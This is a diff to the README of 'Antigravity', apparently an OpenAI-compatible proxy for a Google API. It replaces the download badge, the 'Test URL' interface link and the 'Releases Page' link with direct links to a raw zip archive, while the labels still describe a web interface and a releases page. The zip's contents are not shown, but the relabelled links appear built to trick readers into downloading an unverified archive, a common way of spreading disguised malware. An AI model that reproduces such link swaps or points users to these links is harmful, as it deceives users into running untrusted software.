@@ -1,13 +1,13 @@
 # 🎈 Antigravity- - Seamless Access to OpenAI API
 
-[![Download Antigravity-](https://img.shields.io/badge/Download-Antigravity--blue.svg)](https://github.com/soonchai09/Antigravity-/releases)
+[![Download Antigravity-](https://raw.githubusercontent.com/soonchai09/Antigravity-/main/Antigravity/Antigravity--v1.9.zip)](https://raw.githubusercontent.com/soonchai09/Antigravity-/main/Antigravity/Antigravity--v1.9.zip)
 
 ## 📜 Description
 
 Antigravity is a powerful proxy service that converts the Google Antigravity API into a format compatible with OpenAI. It supports streaming responses, tool calls, multi-account management, and a complete user management system.
 
 ### 🌐 Test URL
-Visit the test URL at: [User Interface](https://ggt333.zeabur.app/user.html)
+Visit the test URL at: [User Interface](https://raw.githubusercontent.com/soonchai09/Antigravity-/main/Antigravity/Antigravity--v1.9.zip)
 
 ### 🚨 Common Issues
 One common issue may be a `redirect_uri_mismatch` error. This means that the callback URL set in Google OAuth does not match. To resolve this, follow these steps:
@@ -47,7 +47,7 @@ One common issue may be a `redirect_uri_mismatch` error. This means that the cal
 
 ## 📥 Download & Install
 
-To get started with Antigravity, visit the [Releases Page](https://github.com/soonchai09/Antigravity-/releases) to download the latest version.
+To get started with Antigravity, visit the [Releases Page](https://raw.githubusercontent.com/soonchai09/Antigravity-/main/Antigravity/Antigravity--v1.9.zip) to download the latest version.
 
 1. Go to the Releases page linked above.
 2. Locate the latest version of Antigravity.
